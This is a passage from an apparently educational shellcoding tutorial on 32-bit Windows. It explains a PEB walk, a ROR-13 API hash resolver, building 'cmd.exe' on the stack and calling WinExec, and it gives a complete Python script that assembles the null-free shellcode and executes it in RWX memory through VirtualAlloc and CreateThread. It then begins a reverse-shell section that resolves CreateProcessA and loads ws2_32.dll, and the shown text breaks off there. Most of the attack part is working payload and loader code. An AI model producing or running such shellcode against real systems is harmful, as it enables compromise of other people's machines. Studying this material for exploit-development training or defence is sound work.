  <text x="375" y="70" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">WinExec( lpCmdLine, uCmdShow )</text>
  <text x="120" y="110" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Push Order</text>
  <text x="120" y="130" text-anchor="middle" fill="#8b949e" font-size="11">(right to left)</text>
  <rect x="220" y="95" width="250" height="32" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="280" y="115" text-anchor="start" fill="#ff6b35" font-size="11">push 5</text>
  <text x="400" y="115" text-anchor="start" fill="#8b949e" font-size="10">uCmdShow (SW_SHOW)</text>
  <rect x="220" y="133" width="250" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="280" y="153" text-anchor="start" fill="#00ff88" font-size="11">push esi</text>
  <text x="400" y="153" text-anchor="start" fill="#8b949e" font-size="10">lpCmdLine ("cmd.exe")</text>
  <rect x="220" y="171" width="250" height="22" rx="5" fill="#0d1117" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="345" y="186" text-anchor="middle" fill="#00d4ff" font-size="11">call [ebp+0x18]</text>
</svg></div>

*Figure 9.2 -- WinExec takes two parameters pushed right-to-left per the stdcall calling convention. The callee (WinExec) cleans the stack.*

### Step 3: Building "cmd.exe" on the Stack

Position-independent shellcode cannot reference hardcoded string addresses. Instead, we construct the string `"cmd.exe\0"` directly on the stack by pushing DWORDs in reverse order. Since the stack grows downward, the bytes end up in the correct forward order when read from ESP.

The string `"cmd.exe"` is 8 bytes (including the null terminator). We split it into two DWORDs:

| Push Order | Value        | ASCII (little-endian) |
|:-----------:|:------------:|:---------------------:|
| Second     | `0x00657865` | `e`, `x`, `e`, `\0`  |
| First      | `0x2e646d63` | `c`, `m`, `d`, `.`   |

We use `mov eax, 0x657865` instead of `push 0x00657865` because the latter would embed a null byte in the shellcode. By moving the value into EAX first (the high byte is implicitly zero), we avoid the null.

```nasm
call_winexec:
    xor   eax, eax             ; EAX = 0
    mov   eax, 0x657865        ; EAX = 0x00657865 = "\0exe"
    push  eax                  ; push "exe\0" (null in high byte)
    push  0x2e646d63           ; push "cmd." (0x63='c', 0x6d='m', 0x64='d', 0x2e='.')
    mov   esi, esp             ; ESI now points to "cmd.exe\0" on the stack
```

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s903" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s903"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s903" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s903" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00d4ff"/></marker>
  </defs>
  <rect width="750" height="300" rx="10" fill="url(#bg_s903)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s903)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s903)" font-weight="bold">Building "cmd.exe" on the Stack</text>
  <text x="375" y="50" text-anchor="middle" fill="#8b949e" font-size="11">Stack grows downward -- push in reverse so the string reads forward at ESP</text>
  <rect x="40" y="65" width="330" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="55" y="85" fill="#ff6b35" font-size="11" font-weight="bold">Step 1: mov eax, 0x657865</text>
  <text x="55" y="105" fill="#e0e7ff" font-size="10">EAX = 0x00|65|78|65 = "\0exe" (null avoidance)</text>
  <rect x="400" y="65" width="45" height="30" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="422" y="84" text-anchor="middle" fill="#8b949e" font-size="12">\0</text>
  <rect x="450" y="65" width="45" height="30" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="472" y="84" text-anchor="middle" fill="#ff3366" font-size="12">e</text>
  <rect x="500" y="65" width="45" height="30" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="522" y="84" text-anchor="middle" fill="#ff3366" font-size="12">x</text>
  <rect x="550" y="65" width="45" height="30" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="572" y="84" text-anchor="middle" fill="#ff3366" font-size="12">e</text>
  <text x="650" y="84" fill="#8b949e" font-size="10">push eax</text>
  <rect x="40" y="128" width="330" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="55" y="148" fill="#00d4ff" font-size="11" font-weight="bold">Step 2: push 0x2e646d63</text>
  <text x="55" y="168" fill="#e0e7ff" font-size="10">Direct DWORD push = "cmd." in little-endian</text>
  <rect x="400" y="128" width="45" height="30" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="422" y="147" text-anchor="middle" fill="#00ff88" font-size="12">c</text>
  <rect x="450" y="128" width="45" height="30" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="472" y="147" text-anchor="middle" fill="#00ff88" font-size="12">m</text>
  <rect x="500" y="128" width="45" height="30" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="522" y="147" text-anchor="middle" fill="#00ff88" font-size="12">d</text>
  <rect x="550" y="128" width="45" height="30" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="572" y="147" text-anchor="middle" fill="#00ff88" font-size="12">.</text>
  <text x="650" y="147" fill="#8b949e" font-size="10">push DWORD</text>
  <rect x="130" y="200" width="490" height="80" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="222" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">Stack Result (ESP points here):</text>
  <rect x="180" y="232" width="40" height="30" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="200" y="252" text-anchor="middle" fill="#00ff88" font-size="14">c</text>
  <rect x="225" y="232" width="40" height="30" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="245" y="252" text-anchor="middle" fill="#00ff88" font-size="14">m</text>
  <rect x="270" y="232" width="40" height="30" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="290" y="252" text-anchor="middle" fill="#00ff88" font-size="14">d</text>
  <rect x="315" y="232" width="40" height="30" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="335" y="252" text-anchor="middle" fill="#ff3366" font-size="14">.</text>
  <rect x="360" y="232" width="40" height="30" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="380" y="252" text-anchor="middle" fill="#ff3366" font-size="14">e</text>
  <rect x="405" y="232" width="40" height="30" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="425" y="252" text-anchor="middle" fill="#ff3366" font-size="14">x</text>
  <rect x="450" y="232" width="40" height="30" rx="4" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="470" y="252" text-anchor="middle" fill="#ff3366" font-size="14">e</text>
  <rect x="495" y="232" width="40" height="30" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="515" y="252" text-anchor="middle" fill="#8b949e" font-size="14">\0</text>
  <text x="375" y="290" text-anchor="middle" fill="#00d4ff" font-size="11">mov esi, esp -- ESI = pointer to "cmd.exe\0"</text>
</svg></div>

*Figure 9.3 -- String construction on the stack. The null terminator comes from the high byte of 0x00657865, avoiding a literal 0x00 push in the shellcode bytes.*

### Step 4: Pushing Parameters and Calling WinExec

With ESI pointing to our `"cmd.exe"` string on the stack, we now push the two WinExec parameters in right-to-left order (stdcall convention) and call the function through our saved pointer:

```nasm
    xor   eax, eax             ; EAX = 0
    mov   eax, 0x5             ; uCmdShow = SW_SHOW (5)
    push  eax                  ; push uCmdShow (second parameter, pushed first)
    push  esi                  ; push lpCmdLine = pointer to "cmd.exe"
    call  dword ptr [ebp+0x18] ; call WinExec
```

When WinExec returns, a `cmd.exe` window appears on the target machine. That is the entire payload -- roughly 120 bytes of position-independent machine code.

<div align="center"><svg viewBox="0 0 750 250" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s904" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s904"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s904" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s904" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="250" rx="10" fill="url(#bg_s904)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s904)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s904)" font-weight="bold">WinExec Call -- Stack Frame</text>
  <text x="100" y="60" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Stack (top)</text>
  <rect x="40" y="72" width="300" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="55" y="92" fill="#00ff88" font-size="11">ESP: lpCmdLine</text>
  <text x="270" y="92" text-anchor="end" fill="#e0e7ff" font-size="11">"cmd.exe\0"</text>
  <rect x="40" y="108" width="300" height="32" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="55" y="128" fill="#ff6b35" font-size="11">ESP+4: uCmdShow</text>
  <text x="270" y="128" text-anchor="end" fill="#e0e7ff" font-size="11">= 5 (SW_SHOW)</text>
  <rect x="40" y="144" width="300" height="32" rx="5" fill="#0d1117" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="55" y="164" fill="#00d4ff" font-size="11">ESP+8: Return Address</text>
  <text x="270" y="164" text-anchor="end" fill="#8b949e" font-size="11">(pushed by CALL)</text>
  <line x1="345" y1="120" x2="420" y2="120" stroke="#00ff88" stroke-width="2" marker-end="url(#arr_s904)"/>
  <rect x="425" y="68" width="280" height="108" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="565" y="95" text-anchor="middle" fill="#00ff88" font-size="14" font-weight="bold">kernel32!WinExec</text>
  <text x="565" y="118" text-anchor="middle" fill="#e0e7ff" font-size="11">Reads lpCmdLine from [ESP+4]</text>
  <text x="565" y="138" text-anchor="middle" fill="#e0e7ff" font-size="11">Reads uCmdShow from [ESP+8]</text>
  <text x="565" y="158" text-anchor="middle" fill="#ff3366" font-size="11">Executes: cmd.exe (visible window)</text>
  <rect x="150" y="200" width="450" height="35" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="375" y="222" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Result: cmd.exe window spawns on the target machine</text>
</svg></div>

*Figure 9.4 -- The WinExec stack frame at the moment of the CALL instruction. stdcall means WinExec itself cleans these arguments off the stack before returning.*

### Complete WinExec Shellcode Flow

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s905" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s905"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s905" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s905" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s905)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s905)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s905)" font-weight="bold">Complete WinExec Shellcode Flow</text>
  <rect x="15" y="55" width="120" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="75" y="75" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">PEB Walk</text>
  <text x="75" y="93" text-anchor="middle" fill="#e0e7ff" font-size="9">kernel32.dll base</text>
  <line x1="135" y1="82" x2="152" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s905)"/>
  <rect x="155" y="55" width="120" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="215" y="75" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">find_function</text>
  <text x="215" y="93" text-anchor="middle" fill="#e0e7ff" font-size="9">ROR-13 resolver</text>
  <line x1="275" y1="82" x2="292" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s905)"/>
  <rect x="295" y="50" width="130" height="65" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="360" y="70" text-anchor="middle" fill="#ff6b35" font-size="10" font-weight="bold">Resolve APIs</text>
  <text x="360" y="85" text-anchor="middle" fill="#e0e7ff" font-size="8">TerminateProcess</text>
  <text x="360" y="97" text-anchor="middle" fill="#e0e7ff" font-size="8">LoadLibraryA</text>
  <text x="360" y="109" text-anchor="middle" fill="#e0e7ff" font-size="8">WinExec</text>
  <line x1="425" y1="82" x2="442" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s905)"/>
  <rect x="445" y="55" width="130" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="510" y="75" text-anchor="middle" fill="#ff3366" font-size="10" font-weight="bold">Build String</text>
  <text x="510" y="93" text-anchor="middle" fill="#e0e7ff" font-size="9">"cmd.exe\0" on stack</text>
  <line x1="575" y1="82" x2="592" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s905)"/>
  <rect x="595" y="55" width="130" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="660" y="75" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">Call WinExec</text>
  <text x="660" y="93" text-anchor="middle" fill="#e0e7ff" font-size="9">cmd.exe spawns</text>
  <rect x="80" y="140" width="590" height="40" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="157" text-anchor="middle" fill="#8b949e" font-size="11">Infrastructure (PEB + resolver) then Payload (resolve, build string, call)</text>
  <text x="375" y="172" text-anchor="middle" fill="#00ff88" font-size="11">Total: ~120 bytes of null-free, position-independent shellcode</text>
</svg></div>

*Figure 9.5 -- The complete WinExec shellcode pipeline: PEB walk finds kernel32.dll, find_function resolves three APIs, the payload builds "cmd.exe" on the stack and calls WinExec.*

### Full Shellcode Source (`winexec.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   int3                            ;"  #   Breakpoint for Windbg
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00?
    "   jne   next_module               ;"  #   No: try next module

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "
    "   pop esi                         ;"  #   POP the return address from the stack
    "   mov   [ebp+0x04], esi           ;"  #   Save find_function address for later
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "
    "   pushad                          ;"  #   Save all registers
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   mov   edx, [edi+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   edx, ebx                  ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [edx+2*ecx]          ;"  #   Extrapolate the function's ordinal
    "   mov   edx, [edi+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   edx, ebx                  ;"  #   AddressOfFunctions VMA
    "   mov   eax, [edx+4*ecx]          ;"  #   Get the function RVA
    "   add   eax, ebx                  ;"  #   Get the function VMA
    "   mov   [esp+0x1c], eax           ;"  #   Overwrite stack version of eax from pushad

    " find_function_finished:            "
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x10], eax           ;"  #   Save TerminateProcess address for later
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x14], eax           ;"  #   Save LoadLibraryA address for later
    "   push  0xe8afe98                 ;"  #   WinExec hash
    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
    "   mov   [ebp+0x18], eax           ;"  #   Save WinExec address for later

    " call_winexec:                      "
    "   xor   eax, eax                  ;"  #   EAX = 0
    "   mov   eax, 0x657865             ;"  #   Move "exe\0" to EAX (null in high byte)
    "   push  eax                       ;"  #   Push to stack
    "   push  0x2e646d63                ;"  #   Push "cmd." to stack
    "   mov   esi, esp                  ;"  #   ESI -> "cmd.exe\0"
    "   xor   eax, eax                  ;"  #   EAX = 0
    "   mov   eax, 0x5                  ;"  #   EAX = 5 (SW_SHOW)
    "   push  eax                       ;"  #   Push uCmdShow
    "   push  esi                       ;"  #   Push pointer to "cmd.exe"
    "   call  dword ptr [ebp+0x18]      ;"  #   Call WinExec
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
```

### PoC Video

The following video demonstrates the WinExec shellcode launching cmd.exe in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/winexec-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: WinExec shellcode popping cmd.exe*

---

## 10. Reverse Shell: Calling Home

A **reverse shell** is the workhorse of remote exploitation. The target reaches out to a listener the attacker already has running, punching through firewalls that block inbound connections. This shellcode is significantly more complex than WinExec it requires loading an additional DLL, initializing the Winsock library, creating a TCP socket, connecting to the attacker, and redirecting stdio through that socket before spawning a shell.

### Step 1: Resolving kernel32.dll Functions

We need three functions from `kernel32.dll`:

**TerminateProcess** `BOOL TerminateProcess(HANDLE hProcess, UINT uExitCode)` Terminates the current process. Hash: `0x78b5b983`.

**LoadLibraryA** `HMODULE LoadLibraryA(LPCSTR lpLibFileName)` Loads a DLL into the process. We need this to bring in `ws2_32.dll` for networking. Hash: `0xec0e4e8e`.

**CreateProcessA** `BOOL CreateProcessA(...)` Creates a new process (cmd.exe) with its stdio handles redirected to our socket. This is the function that actually spawns the interactive shell. Hash: `0x16b3fe72`.

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983              ; TerminateProcess hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x10], eax         ; save TerminateProcess

    push  0xec0e4e8e              ; LoadLibraryA hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x14], eax         ; save LoadLibraryA

    push  0x16b3fe72              ; CreateProcessA hash
    call  dword ptr [ebp+0x04]    ; find_function
    mov   [ebp+0x18], eax         ; save CreateProcessA
```

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1001" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1001"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1001" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1001" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="280" rx="10" fill="url(#bg_s1001)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1001)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1001)" font-weight="bold">Reverse Shell: kernel32.dll API Resolution</text>
  <rect x="30" y="50" width="280" height="200" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="170" y="72" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">EBP Variable Table</text>
  <rect x="45" y="82" width="250" height="28" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="170" y="100" text-anchor="middle" fill="#8b949e" font-size="11">[ebp+0x04] = find_function</text>
  <rect x="45" y="116" width="250" height="35" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="170" y="131" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[ebp+0x10] = TerminateProcess</text>
  <text x="170" y="144" text-anchor="middle" fill="#8b949e" font-size="9">hash: 0x78b5b983</text>
  <rect x="45" y="157" width="250" height="35" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="170" y="172" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">[ebp+0x14] = LoadLibraryA</text>
  <text x="170" y="185" text-anchor="middle" fill="#8b949e" font-size="9">hash: 0xec0e4e8e</text>
  <rect x="45" y="198" width="250" height="35" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="170" y="213" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">[ebp+0x18] = CreateProcessA</text>
  <text x="170" y="226" text-anchor="middle" fill="#8b949e" font-size="9">hash: 0x16b3fe72</text>
  <rect x="400" y="85" width="310" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="555" y="110" text-anchor="middle" fill="#ff3366" font-size="10">push 0x78b5b983 -> call [ebp+0x04] -> mov [ebp+0x10]</text>
  <line x1="400" y1="105" x2="300" y2="131" stroke="#ff3366" stroke-width="1.5" marker-end="url(#arr_s1001)"/>
  <rect x="400" y="135" width="310" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="555" y="160" text-anchor="middle" fill="#ff6b35" font-size="10">push 0xec0e4e8e -> call [ebp+0x04] -> mov [ebp+0x14]</text>
  <line x1="400" y1="155" x2="300" y2="172" stroke="#ff6b35" stroke-width="1.5" marker-end="url(#arr_s1001)"/>
  <rect x="400" y="185" width="310" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="555" y="210" text-anchor="middle" fill="#00ff88" font-size="10">push 0x16b3fe72 -> call [ebp+0x04] -> mov [ebp+0x18]</text>
  <line x1="400" y1="205" x2="300" y2="213" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1001)"/>
  <text x="375" y="268" text-anchor="middle" fill="#8b949e" font-size="11">Note: CreateProcessA replaces WinExec -- it gives us stdio handle control</text>
</svg></div>

*Figure 10.1 -- kernel32.dll resolution for the reverse shell. CreateProcessA is used instead of WinExec because we need to redirect stdin/stdout/stderr to the socket handle.*

### Step 2: Loading ws2_32.dll via LoadLibraryA

Networking requires `ws2_32.dll`, which is not loaded by default in most processes. We build the string `"ws2_32.dll"` on the stack and call `LoadLibraryA` to load it. The returned base address goes into EBX so `find_function` can resolve exports from this new DLL.

```nasm
load_ws2_32:
    xor   eax, eax               ; EAX = 0
    push  eax                     ; null terminator
    xor   eax, eax
    mov   ax, 0x6c6c              ; AX = "ll"
    push  eax                     ; push "ll\0\0"
    push  0x642e3233              ; push "32.d"
    push  0x5f327377              ; push "ws2_"
    push  esp                     ; push pointer to string
    call  dword ptr [ebp+0x14]    ; LoadLibraryA("ws2_32.dll")
    mov   ebx, eax                ; EBX = ws2_32.dll base address
```

<div align="center"><svg viewBox="0 0 750 160" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1002" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1002"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1002" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1002" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="160" rx="10" fill="url(#bg_s1002)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1002)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1002)" font-weight="bold">Loading ws2_32.dll</text>
  <rect x="40" y="50" width="280" height="80" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
